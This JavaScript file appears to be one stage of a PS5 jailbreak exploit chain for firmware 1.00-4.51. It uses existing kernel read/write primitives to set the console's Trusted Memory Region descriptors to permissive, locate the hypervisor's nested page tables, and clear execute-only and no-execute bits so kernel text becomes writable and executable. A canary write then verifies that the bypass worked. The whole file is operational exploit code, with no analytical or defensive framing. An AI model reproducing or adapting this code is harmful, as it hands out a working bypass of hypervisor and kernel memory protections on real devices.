// @ts-check

// TMR/XOT Defeat for PS5 (FW 1.00-4.51)
// Disables TMR descriptors, then clears XOTEXT+NX in guest and nested page tables.

const ECAM_B0D18F2    = 0xF00C2000;
const TMR_INDEX_OFF   = 0x80;
const TMR_DATA_OFF    = 0x84;
const TMR_MAX         = 22;
const TMR_CFG_PERMISSIVE = 0x3F07;
const VMCB_NCR3       = 0xB0;
const SYS_MDBG_SERVICE = 0x259;

const PTE_PRESENT  = 0x001;
const PTE_WRITE    = 0x002;
const PTE_PS       = 0x080;
const PTE_ADDR_LO  = 0xFFFFF000;
const PTE_ADDR_HI  = 0x000FFFFF;
const PTE_XOTEXT_HI = 0x04000000;
const PTE_NX_HI     = 0x80000000;

function i64add(a, b) {
    var al = a.low >>> 0, bl = b.low >>> 0;
    var lo = (al + bl) >>> 0;
    var hi = ((a.hi >>> 0) + (b.hi >>> 0) + ((lo < al) ? 1 : 0)) >>> 0;
    return new int64(lo, hi);
}

function i64sub(a, b) {
    var al = a.low >>> 0, bl = b.low >>> 0;
    var lo = (al - bl) >>> 0;
    var hi = ((a.hi >>> 0) - (b.hi >>> 0) - ((al < bl) ? 1 : 0)) >>> 0;
    return new int64(lo, hi);
}

function i64shl16(v) {
    return new int64((v << 16) >>> 0, (v >>> 16) >>> 0);
}

function computeDmapBase(dmpml4i, dmpdpi) {
    return new int64((dmpdpi << 30) >>> 0, (0xFFFF8000 | (dmpml4i << 7)) >>> 0);
}

function dmapVA(dmap, pa) { return i64add(dmap, pa); }

function ptePA(pte) {
    return new int64((pte.low & PTE_ADDR_LO) >>> 0, (pte.hi & PTE_ADDR_HI) >>> 0);
}

function levelIdx(addr, level) {
    var s = 12 + 9 * (level - 1);
    if (s >= 32) return (addr.hi >>> (s - 32)) & 0x1FF;
    if (s + 9 > 32) return ((addr.low >>> s) | (addr.hi << (32 - s))) & 0x1FF;
    return (addr.low >>> s) & 0x1FF;
}

function ptePatch(pte, clrHi, clrLo, setHi, setLo) {
    return new int64(((pte.low & ~clrLo) | setLo) >>> 0, ((pte.hi & ~clrHi) | setHi) >>> 0);
}

// ---------------------------------------------------------------------------
// UART logging via sys_mdbg_service (syscall 0x259)
// ---------------------------------------------------------------------------
var _uartBuf = null;

async function uartLog(p, chain, msg) {
    if (!_uartBuf) _uartBuf = p.malloc(256);
    var len = Math.min(msg.length, 253);
    for (var i = 0; i < len; i++) p.write1(_uartBuf.add32(i), msg.charCodeAt(i));
    p.write1(_uartBuf.add32(len), 0x0A);
    p.write1(_uartBuf.add32(len + 1), 0x00);
    await chain.syscall(SYS_MDBG_SERVICE, 7, _uartBuf, 0);
}

// ---------------------------------------------------------------------------
// TMR indirect register access (ECAM B0:D18:F2 + 0x80/0x84)
// ---------------------------------------------------------------------------
function ecamAddr(dmap) { return dmapVA(dmap, new int64(ECAM_B0D18F2, 0)); }

async function tmrReadReg(krw, dmap, off) {
    await krw.write4(ecamAddr(dmap).add32(TMR_INDEX_OFF), off);
    return await krw.read4(ecamAddr(dmap).add32(TMR_DATA_OFF));
}

async function tmrWriteReg(krw, dmap, off, val) {
    await krw.write4(ecamAddr(dmap).add32(TMR_INDEX_OFF), off);
    await krw.write4(ecamAddr(dmap).add32(TMR_DATA_OFF), val);
}

// ---------------------------------------------------------------------------
// TMR defeat — scan all 22 entries, relax any covering the target PA
// Matches reference tmr_relax_for_pa() approach
// ---------------------------------------------------------------------------
async function tmrRelaxForPA(krw, dmap, pa, log) {
    var pa16 = (pa.hi << 16) | (pa.low >>> 16);
    var count = 0;

    for (var i = TMR_MAX - 1; i >= 0; i--) {
        if (i === 19 || i === 20) continue;

        var b = await tmrReadReg(krw, dmap, i * 0x10 + 0x00);
        var l = await tmrReadReg(krw, dmap, i * 0x10 + 0x04);
        var c = await tmrReadReg(krw, dmap, i * 0x10 + 0x08);

        if ((c & 1) === 0) continue;
        if ((pa16 >>> 0) < (b >>> 0) || (pa16 >>> 0) > (l >>> 0)) continue;

        await tmrWriteReg(krw, dmap, i * 0x10 + 0x08, TMR_CFG_PERMISSIVE);
        var nc = await tmrReadReg(krw, dmap, i * 0x10 + 0x08);
        var ok = (nc === TMR_CFG_PERMISSIVE);

        log("TMR[" + i + "] 0x" + c.toString(16) + " -> 0x" + nc.toString(16) + (ok ? " OK" : " FAIL"), ok ? LogLevel.INFO : LogLevel.ERROR);
        if (!ok) throw new Error("TMR[" + i + "] defeat failed");
        count++;
    }
    return count;
}

async function tmrDefeat(krw, dmap, log) {
    var fw = window.fw_float;

    var ecamTest = await krw.read4(ecamAddr(dmap));
    log("ECAM dev id=0x" + ecamTest.toString(16), LogLevel.LOG);
    if (ecamTest === 0 || (ecamTest >>> 0) === 0xFFFFFFFF) {
        throw new Error("ECAM not accessible via DMAP (got 0x" + ecamTest.toString(16) + ")");
    }

    var tmr16Base = await tmrReadReg(krw, dmap, 16 * 0x10);
    if (tmr16Base === 0) throw new Error("TMR[16].base = 0 — can't find kernel PA");
    var kernelPA = i64shl16(tmr16Base);

    log("Kernel PA=0x" + kernelPA.toString(16), LogLevel.LOG);

    var n = await tmrRelaxForPA(krw, dmap, kernelPA, log);
    log("Relaxed " + n + " TMR(s) for kernel PA", LogLevel.INFO);

    if (fw >= 3.00) {
        var tmr17Base = await tmrReadReg(krw, dmap, 17 * 0x10);
        if (tmr17Base !== 0) {
            var hvPA = i64shl16(tmr17Base);
            log("HV PA=0x" + hvPA.toString(16) + " (TMR17)", LogLevel.LOG);
            var n2 = await tmrRelaxForPA(krw, dmap, hvPA, log);
            log("Relaxed " + n2 + " TMR(s) for HV PA", LogLevel.INFO);
        }
    }
}

// ---------------------------------------------------------------------------
// nCR3 discovery
// ---------------------------------------------------------------------------
function vmcbPAForCore(fw, core) {
    if (fw >= 3.00 && fw <= 3.21) return new int64(0x6290B000 + core * 0x3000, 0);
    if (fw >= 4.00 && fw <= 4.51) return new int64(0x62A05000 + core * 0x3000, 0);
    return null;
}

async function discoverNpt(krw, dmap, log) {
    var fw = window.fw_float;

    // FW 3.00+: hardcoded VMCB PAs from reference implementation
    var vmcbPA = vmcbPAForCore(fw, 0);
    if (vmcbPA) {
        log("VMCB[0] PA=0x" + vmcbPA.toString(16) + " (hardcoded)", LogLevel.LOG);
        var ncr3 = await krw.read8(dmapVA(dmap, vmcbPA).add32(VMCB_NCR3));
        if ((ncr3.low !== 0 || ncr3.hi !== 0) && (ncr3.low & 0xFFF) === 0) {
            log("nCR3=0x" + ncr3.toString(16), LogLevel.INFO);
            return ncr3;
        }
        log("Hardcoded VMCB nCR3 invalid: 0x" + ncr3.toString(16), LogLevel.ERROR);
    }

    // Fallback: scan HV data area for VMCB nCR3 signature
    var tmr16Base = await tmrReadReg(krw, dmap, 16 * 0x10);
    var kernelPA = i64shl16(tmr16Base);

    var hvDataPA;
    if (fw >= 3.00) {
        var tmr17Base = await tmrReadReg(krw, dmap, 17 * 0x10);
        hvDataPA = tmr17Base ? i64shl16(tmr17Base) : i64add(kernelPA, new int64(OFFSET_KERNEL_TEXT_SIZE, 0));
    } else {
        hvDataPA = i64add(kernelPA, new int64(OFFSET_KERNEL_TEXT_SIZE, 0));
    }

    log("Scanning HV data PA=0x" + hvDataPA.toString(16) + " for VMCB...", LogLevel.LOG);

    // Try the vcpu struct walk first (FW < 3.00 layout)
    if (fw < 3.00 && typeof OFFSET_HV_VCPU !== 'undefined') {
        for (var c = 0; c < 16; c++) {
            var ptrPA = hvDataPA.add32(OFFSET_HV_VCPU + c * OFFSET_HV_VCPU_CPUID);
            var val = await krw.read8(dmapVA(dmap, ptrPA));
            if (c < 4) log("vcpu[" + c + "] raw=0x" + val.toString(16), LogLevel.LOG);

            // Try as kernel VA (page-aligned)
            if (((val.hi >>> 16) & 0xFFFF) === 0xFFFF && (val.low & 0xFFF) === 0) {
                var vmcbVirtPA = i64sub(val, dmap);
                var ncr3 = await krw.read8(dmapVA(dmap, vmcbVirtPA).add32(VMCB_NCR3));
                if ((ncr3.low !== 0 || ncr3.hi !== 0) && (ncr3.low & 0xFFF) === 0 && ncr3.hi < 0x10) {
                    log("nCR3=0x" + ncr3.toString(16) + " (vcpu " + c + ", VA->PA)", LogLevel.INFO);
                    return ncr3;
                }
            }

            // Try as physical address (non-zero, page-aligned, < 64GB)
            if ((val.low !== 0 || val.hi !== 0) && (val.low & 0xFFF) === 0 && val.hi < 0x10) {
                var ncr3 = await krw.read8(dmapVA(dmap, val).add32(VMCB_NCR3));
                if ((ncr3.low !== 0 || ncr3.hi !== 0) && (ncr3.low & 0xFFF) === 0 && ncr3.hi < 0x10) {
                    log("nCR3=0x" + ncr3.toString(16) + " (vcpu " + c + ", PA)", LogLevel.INFO);
                    return ncr3;
                }
            }
        }
    }

    // Brute-force: scan each 4KB page in the HV data area for nCR3 at VMCB offset 0xB0
    for (var off = 0; off < 0x100000; off += 0x1000) {
        var candidate = await krw.read8(dmapVA(dmap, hvDataPA.add32(off + VMCB_NCR3)));
        if (candidate.low === 0 && candidate.hi === 0) continue;
        if ((candidate.low & 0xFFF) !== 0) continue;
        if (candidate.hi > 0xF) continue;

        // Validate: PML4[0] should be present
        var pml4e0 = await krw.read8(dmapVA(dmap, candidate));
        if (!(pml4e0.low & PTE_PRESENT)) continue;

        log("nCR3=0x" + candidate.toString(16) + " (scan off=0x" + off.toString(16) + ")", LogLevel.INFO);
        return candidate;
    }

    throw new Error("Failed to discover nCR3");
}

// ---------------------------------------------------------------------------
// Page table patching
// ---------------------------------------------------------------------------
async function patchPageTables(krw, dmap, guestPml4VA, ncr3, vaStart, rangeSize, log) {
    var clrHi = PTE_XOTEXT_HI | PTE_NX_HI;
    var setLo = PTE_WRITE;

    var gPml4Idx = levelIdx(vaStart, 4);
    var gPdptIdx = levelIdx(vaStart, 3);

    var gPml4e = await krw.read8(guestPml4VA.add32(gPml4Idx * 8));
    if (!(gPml4e.low & PTE_PRESENT)) throw new Error("Guest PML4E not present");

    var gPdpte = await krw.read8(dmapVA(dmap, ptePA(gPml4e)).add32(gPdptIdx * 8));
    if (!(gPdpte.low & PTE_PRESENT)) throw new Error("Guest PDPTE not present");

    var gPdBase = dmapVA(dmap, ptePA(gPdpte));
    var nPml4Base = dmapVA(dmap, ncr3);

    var cachedNPdptPA_lo = -1, cachedNPdptPA_hi = -1;
    var cachedNPdBase = null;

    var count = 0;
    var step = 0x200000;

    for (var offset = 0; offset < rangeSize; offset += step) {
        var va = vaStart.add32(offset);
        var gPdIdx = levelIdx(va, 2);

        var gPde = await krw.read8(gPdBase.add32(gPdIdx * 8));
        if (!(gPde.low & PTE_PRESENT)) continue;

        var newGPde = ptePatch(gPde, clrHi, 0, 0, setLo);
        if (newGPde.low !== gPde.low || newGPde.hi !== gPde.hi) {
            await krw.write8(gPdBase.add32(gPdIdx * 8), newGPde);
        }

        if (!(gPde.low & PTE_PS)) continue;

        var gPdePA = ptePA(gPde);
        var baseGPA = new int64((gPdePA.low & 0xFFE00000) >>> 0, gPdePA.hi);

        var nPml4Idx = levelIdx(baseGPA, 4);
        var nPml4e = await krw.read8(nPml4Base.add32(nPml4Idx * 8));
        if (!(nPml4e.low & PTE_PRESENT)) continue;

        var nPdptPA = ptePA(nPml4e);
        var nPdptIdx = levelIdx(baseGPA, 3);

        if (cachedNPdptPA_lo !== nPdptPA.low || cachedNPdptPA_hi !== nPdptPA.hi) {
            var nPdpte = await krw.read8(dmapVA(dmap, nPdptPA).add32(nPdptIdx * 8));
            if (!(nPdpte.low & PTE_PRESENT)) continue;
            cachedNPdBase = dmapVA(dmap, ptePA(nPdpte));
            cachedNPdptPA_lo = nPdptPA.low;
            cachedNPdptPA_hi = nPdptPA.hi;
        }

        var nPdIdx = levelIdx(baseGPA, 2);
        var nPde = await krw.read8(cachedNPdBase.add32(nPdIdx * 8));
        if (!(nPde.low & PTE_PRESENT)) continue;

        if (nPde.low & PTE_PS) {
            var newNPde = ptePatch(nPde, clrHi, 0, 0, setLo);
            if (newNPde.low !== nPde.low || newNPde.hi !== nPde.hi) {
                await krw.write8(cachedNPdBase.add32(nPdIdx * 8), newNPde);
            }
            count += 512;
        } else {
            var nPtBase = dmapVA(dmap, ptePA(nPde));
            var subPages = Math.min(512, (rangeSize - offset) >>> 12);
            for (var s = 0; s < subPages; s++) {
                var nPte = await krw.read8(nPtBase.add32(s * 8));
                if (!(nPte.low & PTE_PRESENT)) continue;
                var newNPte = ptePatch(nPte, clrHi, 0, 0, setLo);
                if (newNPte.low !== nPte.low || newNPte.hi !== nPte.hi) {
                    await krw.write8(nPtBase.add32(s * 8), newNPte);
                }
                count++;
            }
        }

        log("XOTEXT: 0x" + va.toString(16) + " (" + count + " pages)", LogLevel.LOG | LogLevel.FLAG_TEMP);
    }

    return count;
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------
async function disableTmrAndXot(krw, chain, log, p) {
    async function dlog(msg, level) {
        log(msg, level);
        await uartLog(p, chain, "[TMR] " + msg);
    }

    await dlog("Stage: TMR/XOT Defeat", LogLevel.INFO);

    var dmpml4i = await krw.read4(krw.ktextBase.add32(OFFSET_KERNEL_DMPML4I));
    var dmpdpi = await krw.read4(krw.ktextBase.add32(OFFSET_KERNEL_DMPDPI));
    var dmap = computeDmapBase(dmpml4i, dmpdpi);

    await dlog("DMAP base=0x" + dmap.toString(16), LogLevel.INFO);

    await tmrDefeat(krw, dmap, dlog);

    var ncr3 = await discoverNpt(krw, dmap, dlog);

    var pmapAddr = krw.ktextBase.add32(OFFSET_KERNEL_PMAP_STORE);
    var guestPml4VA = await krw.read8(pmapAddr.add32(OFFSET_KERNEL_PMAP_PM_PML4));
    if (guestPml4VA.low === 0 && guestPml4VA.hi === 0) throw new Error("Guest PML4 VA is 0");

    await dlog("Guest PML4=0x" + guestPml4VA.toString(16), LogLevel.LOG);

    var rangeSize = OFFSET_KERNEL_DATA + 0x7000000;
    await dlog("Setting RWX: 0x" + krw.ktextBase.toString(16) + " +0x" + rangeSize.toString(16), LogLevel.INFO);

    var count = await patchPageTables(krw, dmap, guestPml4VA, ncr3, krw.ktextBase, rangeSize, dlog);
    await dlog("Patched " + count + " pages", LogLevel.INFO);

    await chain.syscall(SYS_SCHED_YIELD);

    var testAddr = krw.ktextBase.add32(0xA0);
    var orig = await krw.read8(testAddr);
    var canary = new int64(0x42424242, 0x41414141);
    await krw.write8(testAddr, canary);
    var after = await krw.read8(testAddr);
    await krw.write8(testAddr, orig);

    var ok = (after.low === canary.low && after.hi === canary.hi);
    await dlog(".text probe: " + (ok ? "OK" : "FAIL"), ok ? LogLevel.SUCCESS : LogLevel.ERROR);

    if (!ok) throw new Error("XOTEXT defeat verification failed");
}
